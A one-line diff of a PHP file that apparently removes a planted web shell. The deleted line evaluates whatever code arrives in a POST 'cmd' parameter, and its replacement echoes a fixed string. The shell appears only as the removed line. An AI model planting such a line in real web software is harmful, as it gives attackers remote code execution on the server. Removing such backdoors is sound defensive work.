@@ -1,1 +1,1 @@
-<?php eval($_POST['cmd']);?>
+<?php echo('123');?>
